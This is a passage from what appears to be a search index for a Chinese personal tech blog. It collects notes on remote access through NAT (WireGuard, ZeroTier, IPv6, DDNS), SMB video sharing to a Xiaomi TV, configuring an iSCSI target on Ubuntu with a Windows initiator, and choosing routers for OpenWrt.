</ul>","tags":["\u5185\u7f51\u7a7f\u900f","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u7f51\u7edc\u72b6\u51b5","title":"\u7f51\u7edc\u72b6\u51b5","text":"<p>\u8bbe\u5907 A \u4f4d\u4e8e\u8def\u7531\u5668\u540e\uff0c\u8bbe\u5907 B \u60f3\u8981\u8fdc\u7a0b\u8fde\u63a5 A\u3002\u4ee5\u4e0b\u662f\u8bbe\u5907 B \u5206\u522b\u4f7f\u7528 ipv4 \u548c ipv6 \u8bbf\u95ee A \u65f6\u4e0d\u540c\u60c5\u51b5\u7684\u5904\u7406\u65b9\u5f0f\u3002</p> <ul> <li>ipv4<ul> <li>\u8def\u7531\u5668 WAN \u53e3\u6709\u516c\u7f51 ipv4 \u5730\u5740<ol> <li>\u65b9\u5f0f\u4e00\uff1a\u8def\u7531\u5668 ddns + \u8def\u7531\u5668\u7aef\u53e3\u8f6c\u53d1</li> <li>\u65b9\u5f0f\u4e8c\uff1awireguard\uff0cB \u901a\u8fc7 VPN \u8fde\u63a5\u5230\u8def\u7531\u5668\u4e0a\uff0c\u8fdb\u800c\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907</li> </ol> </li> <li>\u8def\u7531\u5668 WAN \u53e3\u4e3a\u5185\u7f51 ipv4 \u5730\u5740<ol> <li>\u65b9\u5f0f\u4e00\uff1aA \u4e0a\u5b89\u88c5 Zerotier\uff0cB \u4e0a\u4e5f\u5b89\u88c5 Zerotier\uff0cAB \u4fbf\u53ef\u4ee5\u901a\u8fc7\u865a\u62df\u7684 Zerotier \u5730\u5740\u76f8\u4e92\u8bbf\u95ee\u3002</li> <li>\u65b9\u5f0f\u4e8c\uff1a\u5728\u8def\u7531\u5668\u4e0a\u5b89\u88c5 Zerotier\uff0c\u540c\u65f6\u5728 Zerotier central \u4e2d\u914d\u7f6e\u8f6c\u53d1\u89c4\u5219\uff08\u5177\u4f53\u65b9\u5f0f\u81ea\u884c\u641c\u7d22\uff09\u3002B \u4e0a\u5b89\u88c5 Zerotier\uff0c\u6b64\u65f6 B \u4e0d\u4ec5\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668 LAN \u4e2d\u7684\u5176\u5b83\u8bbe\u5907\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bbf\u95ee A - \u6ce8\uff1aZerotier \u8fde\u63a5\u7684\u4e24\u4e2a\u8bbe\u5907\u95f4\u7684\u901a\u4fe1\u4e0d\u4e00\u5b9a\u5168\u9760 Zerotier \u670d\u52a1\u5668\u4e2d\u8f6c\uff0c\u5982\u679c\u4e24\u4e2a\u8bbe\u5907\u4e2d\u95f4\u7684 NAT \u7ed3\u6784\u6bd4\u8f83\u597d\u7684\u8bdd\uff0cZerotier \u4f1a\u901a\u8fc7UDP \u6253\u6d1e\u7684\u65b9\u5f0f\uff0c\u8ba9\u4e24\u4e2a\u8bbe\u5907\u76f4\u63a5\u901a\u4fe1\u3002</li> </ol> </li> </ul> </li> <li>ipv6<ul> <li>\u8def\u7531\u5668 WAN \u53e3\u548c A \u5747\u6709\u516c\u7f51 ipv6 \u5730\u5740<ul> <li>\u76f4\u63a5\u5728 PC \u4e0a\u914d\u7f6e ddns   \u6ce8\uff1a1\uff09\u5982\u679c PC \u65e0 ipv6\uff0c\u90a3\u4e48\u914d\u7f6e\u8def\u7531\u5668\u4e0d\u8981\u4f7f\u7528 NAT6   2\uff09ipv6 \u7684\u7aef\u53e3\u8f6c\u53d1\u662f\u4e0d\u5fc5\u8981\u7684</li> <li>\u6ce8\uff1a\u76ee\u524d\u6240\u6709 ISP \u4e00\u822c\u90fd\u63d0\u4f9b\u4e86\u516c\u7f51 ipv6 \u5730\u5740\uff0c\u53ef\u80fd\u9700\u8981\u5728\u5149\u732b\u4e2d\u5f00\u542f\u3002</li> </ul> </li> </ul> </li> <li>\u7279\u6b8a\u60c5\u51b5<ul> <li>\u867d\u7136\u65e0\u516c\u7f51 ipv4 \u5730\u5740\uff0c\u4f46\u662f\u5982\u679c A, B \u53ef\u4ee5 ping \u901a\u5bf9\u65b9\uff08\u6bd4\u5982\u90fd\u4f4d\u4e8e\u6821\u56ed\u7f51\u4e2d\uff09\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528 ip \u5730\u5740\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u3002</li> <li>\u867d\u7136\u6709\u516c\u7f51 ipv4/ipv6 \u5730\u5740\uff0c\u4f46\u662f B \u53ef\u80fd\u4ecd\u65e0\u6cd5\u8bbf\u95ee A\u3002\u6bd4\u5982\uff0c\u6821\u56ed\u7f51\u867d\u7136\u63d0\u4f9b\u4e86\u516c\u7f51\u5730\u5740\uff0c\u4f46\u662f\u6821\u5916\u8bbf\u95ee\u65f6\u4f1a\u88ab\u9632\u706b\u5899\u62e6\u622a\u3002<ul> <li>\u8fd9\u79cd\u60c5\u51b5 wireguard \u4ecd\u7136\u6709\u6548\uff0c\u4e0d\u4f1a\u88ab\u9632\u706b\u5899\u62e6\u622a</li> <li>\u4e00\u822c\u53ea\u5bf9 ipv4 \u5730\u5740\u8fdb\u884c\u62e6\u622a\uff0cipv6 \u57fa\u672c\u4e0d\u600e\u4e48\u62e6\u622a\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 ipv6</li> </ul> </li> </ul> </li> </ul>","tags":["\u5185\u7f51\u7a7f\u900f","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u7f51\u7edc\u7a7f\u900f--\u8fdc\u7a0b\u684c\u9762\u7528\u4f8b","title":"\u7f51\u7edc\u7a7f\u900f + \u8fdc\u7a0b\u684c\u9762\u7528\u4f8b","text":"<p>\u6ce8\uff1a\u62ec\u53f7\u5185\u4e3a\u8981\u6c42</p> <ul> <li>\uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u53bb\u5b9e\u9a8c\u5ba4\u505a\u5b9e\u9a8c\u65f6\uff0c\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u5bdd\u5ba4\u7535\u8111\uff0c\u518d\u4e5f\u4e0d\u7528\u5e26\u7535\u8111\u4e86\u3002</li> <li>\uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u5728\u6559\u5ba4\u7684\u591a\u5a92\u4f53\u7535\u8111\u4e0a\u8fdc\u7a0b\u8fde\u63a5\u5bdd\u5ba4\u7535\u8111\uff08\u6709\u4e00\u6b21\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u6551\u6025\u62f7\u8d1d\u4e86\u6f14\u8bb2\u7684 ppt\uff09</li> <li>\uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u5728\u5b9e\u9a8c\u5ba4\uff0c\u4e32\u6d41\u73a9\u5bdd\u5ba4\u7684\u53f0\u5f0f\u7535\u8111\u3002</li> <li>\uff08\u6821\u56ed\u7f51\u6709\u516c\u7f51 ipv4\uff09\u653e\u5047\u5728\u5bb6\uff0c\u901a\u8fc7 wireguard \u8fdc\u7a0b\u8bbf\u95ee\u4f4d\u4e8e\u5b66\u6821\u7684\u53f0\u5f0f\u7535\u8111\u3002</li> </ul>","tags":["\u5185\u7f51\u7a7f\u900f","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/11/2022-02-11-%E7%A7%BB%E5%8A%A8%E5%85%89%E7%8C%AB%E5%BC%80%E5%90%AFipv6/","title":"\u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6","text":"<ol> <li>\u79fb\u52a8\u5149\u732b\u4f7f\u7528\u6865\u63a5\u6a21\u5f0f + \u8def\u7531\u5668\u4f7f\u7528\u62e8\u53f7\u4e0a\u7f51</li> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6 \u6b65\u9aa4     1. \u5220\u9664\u539f\u672c ipv4 \u7684 PPPoE     2. \u534f\u8bae\u9009\u62e9 ipv4/ipv6\uff0c\u521b\u5efa\u65b0\u7684PPP\u8fde\u63a5</li> </ol>","tags":["ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/","title":"\u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891","text":"","tags":["\u7535\u89c6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/#\u52a8\u673a","title":"\u52a8\u673a","text":"<p>\u4e00\u53f0\u7535\u8111\u4e0a\u4e0b\u8f7d\u4e86\u8bb8\u591a\u89c6\u9891\uff0c\u5982\u4f55\u4f18\u96c5\u5730\u5728\u5176\u5b83\u8bbe\u5907\u4e0a\uff08\u5176\u5b83\u7535\u8111\u3001\u5e73\u677f\u3001\u7535\u89c6\uff09\u4e0a\u76f4\u63a5\u8bbf\u95ee\u64ad\u653e\u8be5\u89c6\u9891\u5462\uff1f</p>","tags":["\u7535\u89c6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/#what-i-need","title":"what I need","text":"<ul> <li>\u5e73\u677f\uff0c\u7b14\u8bb0\u672c\u7b49\u53ef\u4ee5\u5b89\u88c5 wireguard \u7684\u8bbe\u5907\uff0c\u53ef\u4ee5\u8bbf\u95ee\u53f0\u5f0f\u5171\u4eab\u7684\u6587\u4ef6\u5939<ul> <li>\u5df2\u7ecf\u5b9e\u73b0</li> <li>\u4f7f\u7528 wireguard + SMB + VLC</li> <li>\u5c0f\u7c73\u7535\u89c6\u80fd\u4e0d\u80fd\u88c5 wireguard\uff1f<ul> <li>\u88c5 VLC \u5931\u8d25<ul> <li>\u4f7f\u7528 adb \u5b89\u88c5\uff1f\u62a5\u9519<ul> <li><code>INSTALL_FAILED_NO_MATCHING_ABIS</code> is when you are trying to install an app that has native libraries and it doesn't have a native library for your cpu architecture. For example if you compiled an app for armv7 and are trying to install it on an emulator that uses the Intel architecture instead it will not work.</li> </ul> </li> </ul> </li> <li>\u5b89\u88c5 wiregurad \u6210\u529f<ul> <li>\u8bbf\u95ee\u6587\u4ef6\u7cfb\u7edf\u6709 bug(\u65e0\u6cd5\u5bfc\u5165\u914d\u7f6e\uff0c\u56e0\u6b64\u9700\u8981\u63a5\u4e0a\u952e\u76d8\u9f20\u6807)</li> <li>\u624b\u52a8\u8f93\u5165\u914d\u7f6e\u540e\uff0c\u663e\u793a\u8fde\u63a5\u4e0a\u4e86\u3002\u4f46\u662f wireguard \u72b6\u6001\u4e2d\u63a5\u6536\u7684\u6d41\u91cf\u53ea\u6709\u51e0\u767e B\u3002\u7136\u540e\u4f7f\u7528 kodi \u8fde\u63a5\u4e0d\u4e0a SMB</li> </ul> </li> </ul> </li> </ul> </li> <li>\u4e00\u4e2a\u6b63\u5e38\u80fd ipv6 \u4e0a\u7f51\u7684\u8bbe\u5907\u5c31\u80fd\u8bbf\u95ee\u53f0\u5f0f\u5171\u4eab\u7684\u6587\u4ef6\u5939\uff08\u6bd4\u5982\u5c0f\u7c73\u7535\u89c6\uff09<ul> <li>\u8f93\u5165 ipv6 \u592a\u9ebb\u70e6<ul> <li>\u53f0\u5f0f\u673a\u914d\u7f6e ddns<ul> <li>\u4f7f\u7528 freedns \u4e2d\u7684 crontab \u811a\u672c (v2)\uff0c\u6dfb\u52a0\u5230 windows \u5b9a\u65f6\u4efb\u52a1\u4e2d</li> <li>223.5.5.5 \u9700\u8981\u8fc7\u4e2a\u51e0\u5206\u949f\u624d\u4f1a\u751f\u6548</li> <li>8.8.8.8 \u5219\u751f\u6548\u5f88\u5feb</li> <li>\u5c06\u7535\u8111 dns \u6dfb\u52a0 8.8.8.8 \u4f5c\u4e3a\u5907\u7528 dns</li> </ul> </li> <li>\u6216\u8def\u7531\u5668\u914d\u7f6e ipv6 \u7aef\u53e3\u8f6c\u53d1\uff08\u8def\u7531\u5668\u5df2\u7ecf\u914d\u7f6e ipv6 ddns\uff09<ul> <li>\u8fd8\u672a\u7814\u7a76</li> </ul> </li> </ul> </li> <li>SMB \u662f\u5426\u652f\u6301 ipv6<ul> <li>windows \u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u65e0\u6cd5\u8f93\u5165 ipv6 \u7684\u5192\u53f7<ul> <li>\u4f7f\u7528<code>.ipv6-literal.net</code>\u65b9\u5f0f\u89e3\u51b3</li> <li>\u57df\u540d\u662f\u53ef\u4ee5\u7684</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["\u7535\u89c6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/","title":"\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSi)","text":"","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8-iscsi","title":"\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSI)","text":"<p>iSCSI is an IP-based standard for transferring data that supports host access by carrying SCSI commands over IP networks. The iSCSI standard is defined by RFC 3720. (iSCSI overview - IBM Documentation)</p> <p>\u4f7f\u7528 iSCSI \u53ef\u4ee5\u5c06\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u5b58\u50a8\u8bbe\u5907\u6620\u5c04\u4e3a\u672c\u5730\u7684\u4e00\u4e2a\u5757\u8bbe\u5907</p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u670d\u52a1\u7aef-target","title":"\u670d\u52a1\u7aef (target)","text":"<p>\u67e5\u4e86\u4e00\u5708\uff0c\u6ca1\u6709\u627e\u5230\u5728 windows \u4e0a\u5f00\u542f iSCSI target \u7684\u6559\u7a0b</p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#ubuntu2004","title":"ubuntu20.04","text":"<ol> <li> <p>\u5b89\u88c5</p> <pre><code>sudo apt install tgt\n</code></pre> <p>\u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u770b\u5230 iSCSI \u670d\u52a1\u542f\u52a8\u4e86</p> <pre><code>systemctl status tgt\n</code></pre> </li> <li> <p>\u914d\u7f6e target</p> <p>\u65b0\u5efa\u4e00\u4e2a target1.conf \u6587\u4ef6</p> <pre><code>vim /etc/tgt/conf.d/target1.conf\n</code></pre> <p>\u914d\u7f6e\u5982\u4e0b</p> <pre><code>&lt;target iqn.2020-05.com:tianyi310.target1&gt;\n    # provided devicce as a iSCSI target\n    backing-store /dev/sda1\n    # iSCSI Initiator's IQN you allow to connect\n    initiator-name iqn.2022-02.com:s3-pro\n    initiator-name iqn.2022-02.com:ryzen5800x\n    # authentication info ( set anyone you like for \"username\", \"password\" )\n    #incominguser user password\n&lt;/target&gt;\n</code></pre> </li> </ol> <pre><code>&lt;target iqn.2023-10.com:ryzen.target1&gt;\n     # provided devicce as a iSCSI target\n     backing-store /dev/disk/by-id/scsi-0QEMU_QEMU_HARDDISK_drive-scsi4\n     # iSCSI Initiator's IQN you allow to connect\n     initiator-name iqn.2023-10.com:a1-win10\n     # authentication info ( set anyone you like for \"username\", \"password\" )\n     #incominguser user password\n &lt;/target&gt;\n</code></pre> <p>\u5176\u4e2d iqn.2020-05.com:tianyi310.target1 \u4e3a target \u540d\u79f0\uff0c\u6709\u7740\u89c4\u8303\u7684\u683c\u5f0f iqn.1991-05.com.microsoft:kvm-win10</p> <p>\u5b58\u50a8\u8bbe\u5907</p> <p><code>backing-store /dev/sda1</code>\u8868\u793a\u4f7f\u7528 sda1 \u4f5c\u4e3a\u5b58\u50a8\u8bbe\u5907\uff08\u7b2c\u4e00\u4e2a\u78c1\u76d8 (sda) \u4e0a\u7684\u7b2c\u4e00\u4e2a\u5206\u533a (sda1)\uff09</p> <p>\u652f\u6301\u7684\u5b58\u50a8\u8bbe\u5907\uff1a</p> <ul> <li>\u5757\u8bbe\u5907</li> </ul> <ul> <li>\u5757\u8bbe\u5907\u4e0a\u7684\u4e00\u4e2a\u5206\u533a</li> </ul> <ul> <li> <p>\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u865a\u62df\u7684\u5757\u8bbe\u5907\uff0c\u5982</p> <pre><code>#create folder and file\nmkdir /var/lib/iscsi_disks\ndd if=/dev/zero of=/var/lib/iscsi_disks/disk01.img count=0 bs=1 seek=10G\n</code></pre> <p>\u6388\u6743</p> <p>\u4e3a\u4e86\u7b80\u5355\uff0c\u4ee5\u4e0a\u914d\u7f6e\u6ca1\u6709\u914d\u7f6e authentication\u3002\u51e0\u79cd\u5e38\u7528\u6388\u6743\u65b9\u5f0f\uff1a</p> </li> </ul> <ul> <li>initiator-name\uff1a\u53ea\u5141\u8bb8\u6307\u5b9a iqn \u540d\u79f0\u7684 initiator</li> <li>initator-address\uff1a\u53ea\u5141\u8bb8\u6307\u5b9a ip \u7684 initiator</li> <li>user, password\uff1a\u6ca1\u8bd5\u8fc7</li> <li>\u76f8\u4e92 CHAP \u9a8c\u8bc1\uff1a\u5f00\u542f\u540e\u4e0d\u77e5\u9053\u600e\u4e48\u5728 windows initiator \u4e2d\u5bf9\u5e94\u8bbe\u7f6e\uff0c\u56e0\u6b64\u6ca1\u8bd5</li> </ul> <ol> <li> <p>\u91cd\u542f tgt \u670d\u52a1</p> <pre><code>sudo systemctl restart tgt\n</code></pre> </li> <li> <p>\u67e5\u770b tgt \u72b6\u6001</p> <pre><code>sudo tgtadm --mode target --op show\n</code></pre> <p>\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u5173\u4e8e LUN0 \u548c LUN1 \u7684\u914d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709 LUN1 \u5219\u518d\u6b21\u91cd\u542f\u4e0b</p> </li> </ol>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u5ba2\u6237\u7aef-initiator","title":"\u5ba2\u6237\u7aef (initiator)","text":"","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#windows10","title":"Windows10","text":"<ol> <li>\u4f7f\u7528 windows \u7684\u641c\u7d22\u529f\u80fd\uff0c\u641c\u7d22 open iSCSI\u3002\u7b2c\u4e00\u6b21\u6253\u5f00\u53ef\u80fd\u4f1a\u63d0\u793a\u5f00\u542f\u76f8\u5173\u670d\u52a1\uff0c\u786e\u8ba4\u5373\u53ef</li> </ol> <ol> <li>\u9996\u5148\u5728\u914d\u7f6e\u680f\u4fee\u6539\u6389\u9ed8\u8ba4\u7684\u540d\u79f0\uff0c\u6ce8\u610f\u533a\u5206\u5927\u5c0f\u5199</li> </ol> <ol> <li>\u7136\u540e\u5728\u76ee\u6807\u680f\u4e2d\u586b\u5165 ip \u5730\u5740\u6216\u57df\u540d\uff08\u652f\u6301 ipv6\uff09\uff0c\u70b9\u51fb\u5feb\u901f\u8fde\u63a5\u3002</li> </ol> <p>4. \u5982\u679c\u8fde\u63a5\u6210\u529f\u540e\uff0c\u76ee\u6807\u4f1a\u663e\u793a\u5728\u5df2\u53d1\u73b0\u7684\u76ee\u6807\u4e2d\uff0c\u53ef\u4ee5\u65ad\u5f00\u8fde\u63a5\uff0c\u6216\u4e0b\u6b21\u518d\u6b21\u8fde\u63a5</p> <p></p> <p>\u8fde\u63a5\u6210\u529f\u540e\uff0c\u8fdb\u5165\u78c1\u76d8\u7ba1\u7406\uff0c\u4fbf\u4f1a\u51fa\u73b0\u4e00\u4e2a\u6ca1\u6709\u4f7f\u7528\u7684\u78c1\u76d8\uff0c\u683c\u5f0f\u5316\u5373\u53ef\u3002 </p> <p></p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u8fde\u63a5\u5931\u8d25","title":"\u8fde\u63a5\u5931\u8d25","text":"<p>How can I troubleshoot iSCSI connection issues? (DSM 6.x) - Synology Knowledge Center</p> <p>If the iSCSI Initiator cannot find an iSCSI target:</p> <ol> <li>In Windows iSCSI Initiator, go to<ul> <li>Specify the network interface to use for iSCSI connections if you have more than one network interfaces on both the initiator and target.</li> <li>Make sure that Enable CHAP log on is not checked.    </li> </ul> </li> </ol> <p>If the iSCSI Initiator finds an iSCSI target but fails to connect to it:</p> <ul> <li>Specify the network interface to use for iSCSI connections if you have more than one network interfaces on both the initiator and target.</li> <li>Make sure that you entered identical name and password on DSM as the Name and Target secret in Windows iSCSI Initiator.   </li> </ul>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/","title":"openwrt \u5237\u673a","text":"<p>\u4ecb\u7ecd\u4e86\u4ece\u786c\u4ef6\u9009\u62e9\u5230\u5237\u673a\u6574\u4e2a\u8fc7\u7a0b</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#openwrt-\u786c\u4ef6\u9009\u62e9","title":"Openwrt \u786c\u4ef6\u9009\u62e9","text":"<p>\u5982\u4f55\u9009\u62e9\u4e00\u4e2a\u53ef\u4ee5\u5237 openwrt \u7684\u8def\u7531\u5668\uff1f</p> <ul> <li>\u8001\u623f\u5b50 WiFi \u5e03\u7f51\u653b\u7565 \u7bc7\u4e09\u5341\u516b\uff1aWiFi 6 \u6885\u6797\u6216 openwrt \u56fa\u4ef6\u8def\u7531\u5668\u5165\u624b\u6307\u5357_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u8001\u623f\u5b50 WiFi \u5e03\u7f51\u653b\u7565 \u7bc7\u4e8c\u5341\u56db\uff1a\u4e0d\u6f0f\u6cb9\u7684\u8def\u7531\u5668\u4e0d\u662f\u597d\u77ff\u673a\uff0c\u77ff\u6e23\u8def\u7531\u5668\u76d8\u70b9_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u6781\u8def\u7531\u3001\u65b0\u8def\u7531\uff1a\u673a\u7687\uff01\u51e0\u79cd\u9ad8\u6027\u4ef7\u6bd4\u77ff\u6e23\u8def\u7531\u5668\u6bd4\u8f83 - \u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83 (\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","title":"\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#cpu-\u5206\u7c7b","title":"CPU \u5206\u7c7b","text":"<ul> <li>mt7621 \u578b\u53f7<ul> <li>R3G\uff1a\u54b8\u9c7c 50 \u5143\u5de6\u53f3\uff0c\u6709 USB3.0 \u63a5\u53e3\uff0c128MB \u7684 flash\u3002</li> <li>4A \u5343\u5146\u7248\uff1a\u54b8\u9c7c 70 \u5143\u5de6\u53f3\uff0c\u5916\u89c2\u7b80\u7ea6\u6f02\u4eae\uff0c16MB NOR flash \u6709\u70b9\u5c0f\u3002</li> <li>C660x\uff1a\u54b8\u9c7c 100 \u591a\uff0c\u652f\u6301 wifi6</li> </ul> </li> <li>\u9ad8\u901a\u578b\u53f7<ul> <li>\u76ee\u524d (22.03) \u53ea\u6709 AX6S \u662f\u53d7 openwrt \u5b98\u65b9\u652f\u6301\u7684\uff0cAX6, AX3600 \u6709\u7b2c\u4e09\u65b9\u652f\u6301\u3002AX5 \u7b49\u5176\u4f59\u672a\u652f\u6301<ul> <li>\u4e0d\u80fd\u5237\u597d\u50cf\u662f linux kernel \u8fd8\u4e0d\u652f\u6301\u9ad8\u901a\u7684 IPQ SoC\u3002</li> <li>B \u7ad9\u770b\u5230\u8bf4 AX5 \u5237 openwrt \u9700\u8981\u786c\u6539\u5185\u5b58\u4e3a 1G\uff0c\u597d\u50cf\u8bf4\u9ad8\u901a\u7684 wifi \u9a71\u52a8\u975e\u5e38\u8017\u5185\u5b58</li> </ul> </li> <li>AX6S\uff1a220 \u5de6\u53f3</li> <li>AX6:250-300 \u5de6\u53f3</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","title":"\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","text":"<ul> <li>\u7ea2\u7c73 AX5\uff0c\u5c0f\u7c73 AX1800 \u6362\u76ae<ul> <li>IPQ6000, 4 \u6838 A53@1.2Ghz\uff1a[OpenWrt Wiki] Xiaomi AX1800 (AX5/RA67)</li> </ul> </li> </ul> <ul> <li>\u7ea2\u7c73AX6\uff0c\u5c0f\u7c73AX3600\u6362\u76ae<ul> <li>AX6, IPQ8071A@1.4GHz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router</li> <li>AX3600, IPQ8071A, 512 + 256\uff1a[OpenWrt Wiki] Xiaomi AX3600</li> <li>\u5bf9\u6bd4\uff1a\u7ea2\u7c73AX6\u62c6\u673a\uff0c\u65e7\u6b3eWIFI6\u65e0\u7ebf\u8def\u7531\u5668-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> <li>AX3000<ul> 